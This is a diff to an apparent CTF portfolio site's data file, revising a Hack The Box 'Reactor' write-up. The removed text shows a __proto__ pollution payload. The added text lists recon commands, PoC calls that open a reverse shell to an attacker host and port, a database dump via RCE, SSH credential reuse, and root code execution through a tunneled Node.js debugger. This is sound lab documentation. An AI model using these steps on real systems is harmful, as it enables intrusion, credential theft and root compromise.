@@ -291,28 +291,40 @@
       flag: "User: XXXX | Root: XXXX"
     },
 
-    reactor: {
-      title: "HTB: Reactor", badge: "Linux // Hard",
+   reactor: {
+      title: "HTB: Reactor", 
+      badge: "Linux // Hard",
       os: "Linux", diff: "Hard", diffColor: "#f59e0b",
-      port: "3000/tcp", time: "~1h 45m", vector: "Proto Pollution → RCE",
+      port: "22, 3000", time: "1h 45m", 
+      vector: "React2Shell RCE → SQLite Credential Reuse → Node.js Debugger (root)",
       hasFullWriteup: true,
       nodes: [
-        {
-          phase: "ENUMERATION", title: "Next.js App Fingerprinting",
-          body: "Port 3000 hosts a Next.js application. API routes exposed with unsanitized JSON body parsing in a merge endpoint.",
-          code: `<span style="color:var(--neon-purple)"># curl http://10.129.10.200:3000/api/config</span>\n<span style="color:var(--neon-cyan)">{"debug":false,"runtime":"nodejs18"}</span>`
+        { 
+          phase: "RECONNAISSANCE", 
+          title: "Service Fingerprinting", 
+          body: "Nmap identified OpenSSH and a Next.js web application on port 3000. Further enumeration of the JavaScript chunks revealed the environment was running Next.js 15.0.3 and React 19.0.0, which are susceptible to the React2Shell vulnerability.", 
+          code: "nmap -sC -sV -p- 10.129.10.200 -A -T4\ncurl -s http://10.129.10.200:3000 | grep -o '/_next/static/chunks/[^\" ]*\\.js'" 
         },
-        {
-          phase: "EXPLOITATION", title: "Prototype Pollution via __proto__",
-          body: "A merge endpoint recursively copies user-supplied keys including __proto__, injecting arbitrary properties onto Object.prototype.",
-          code: `POST /api/merge\n{\n  <span style="color:var(--neon-purple)">"__proto__"</span>: {\n    "env": { <span style="color:var(--neon-green)">"NODE_OPTIONS"</span>: "--require /tmp/shell.js" },\n    "shell": "/bin/sh"\n  }\n}`
+        { 
+          phase: "INITIAL ACCESS", 
+          title: "React2Shell RCE", 
+          body: "Exploiting the CVE-2025-55182 (React2Shell) prototype pollution vulnerability allowed for unauthenticated RCE. I utilized a public exploit script to verify the vulnerability and subsequently established a reverse shell as the 'node' user.", 
+          code: "python3 react2shell-poc.py -t http://10.129.10.200:3000 -c \"id\"\n# Trigger reverse shell:\npython3 react2shell-poc.py -t http://10.129.10.200:3000 --revshell --lhost 10.10.15.219 --lport 4444" 
         },
-        {
-          phase: "SHELL", title: "Initial Foothold // React2Shell",
-          body: "Prototype poisoned. Next child_process spawn inherits our injected env, executing the payload and returning a shell.",
-          code: `<span style="color:var(--neon-purple)"># python3 react2shell-poc.py -t http://10.129.10.200:3000 -c "id"</span>\n<span style="color:var(--neon-green)">uid=1001(node) gid=1001(node) groups=1001(node)</span>`
+        { 
+          phase: "LATERAL MOVEMENT", 
+          title: "SQLite & Credential Reuse", 
+          body: "Upon gaining a shell, I enumerated the application directory and found a SQLite database. Dumping the database revealed user credentials, which I cracked to gain access to the 'engineer' account via SSH.", 
+          code: "python3 react2shell-poc.py -t http://10.129.10.200:3000 -c \"sqlite3 /opt/reactor-app/reactor.db '.dump'\"\n# Cracking hash: reactor1\nssh engineer@10.129.10.200" 
+        },
+        { 
+          phase: "PRIVILEGE ESCALATION", 
+          title: "Node.js Debugger Exploitation", 
+          body: "I discovered a root-owned Node.js process running with the '--inspect' flag enabled on 127.0.0.1:9229. By tunneling this port to my local machine, I connected via Chrome DevTools Protocol to execute arbitrary code as root.", 
+          code: "ssh -L 9229:127.0.0.1:9229 engineer@10.129.10.200\n# In DevTools Console:\nrequire('child_process').execSync('cat /root/root.txt').toString()" 
         }
-      ]
+      ],
+      flag: "User: 02a3d... | Root: 9b1e5..."
     },
 
     active: {
